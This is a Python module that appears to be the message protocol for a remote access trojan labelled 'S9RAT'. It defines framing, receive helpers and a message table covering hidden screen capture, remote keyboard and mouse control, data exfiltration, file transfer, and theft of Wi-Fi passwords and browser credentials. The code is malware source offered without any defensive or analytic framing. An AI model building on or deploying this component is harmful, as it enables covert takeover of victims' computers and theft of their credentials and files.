
import json
import struct
import hashlib
import os

PROTOCOL_VERSION = 1
DEFAULT_PORT = 5555
MAGIC = b"S9RAT"

MSG_TYPES = {
    "AUTH": 1,
    "AUTH_OK": 2,
    "AUTH_FAIL": 3,
    "SCREEN_FRAME": 10,
    "SCREEN_START": 11,
    "SCREEN_STOP": 12,
    "CONTROL_ENABLE": 20,
    "CONTROL_DISABLE": 21,
    "CONTROL_INPUT": 22,
    "KEYBOARD_INPUT": 23,
    "MOUSE_INPUT": 24,
    "EXFIL_DATA": 30,
    "EXFIL_REQUEST": 31,
    "FILE_LIST": 32,
    "FILE_TRANSFER": 33,
    "SYSTEM_INFO": 40,
    "WIFI_PASSWORDS": 41,
    "BROWSER_CREDS": 42,
    "HEARTBEAT": 50,
    "HEARTBEAT_ACK": 51,
    "DISCONNECT": 60,
}


def pack_message(msg_type: str, data: dict) -> bytes:
    msg_bytes = json.dumps(data).encode("utf-8")
    type_id = MSG_TYPES.get(msg_type, 0)
    header = MAGIC + struct.pack("!BI", type_id, len(msg_bytes))
    return header + msg_bytes


def recv_exact(sock, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection closed")
        buf += chunk
    return buf


def recv_message(sock) -> tuple[str, dict]:
    header = recv_exact(sock, 10)
    if header[:5] != MAGIC:
        raise ValueError("Invalid protocol magic")
    type_id = struct.unpack("!B", header[5:6])[0]
    length = struct.unpack("!I", header[6:10])[0]
    if length > 50 * 1024 * 1024:
        raise ValueError("Message too large")
    msg_bytes = recv_exact(sock, length)
    msg_type = None
    for name, tid in MSG_TYPES.items():
        if tid == type_id:
            msg_type = name
            break
    if not msg_type:
        msg_type = f"UNKNOWN_{type_id}"
    return msg_type, json.loads(msg_bytes.decode("utf-8"))


def compute_file_hash(filepath: str) -> str:
    h = hashlib.sha256()
    with open(filepath, "rb") as f:
        while True:
            chunk = f.read(8192)
            if not chunk:
                break
            h.update(chunk)
    return h.hexdigest()
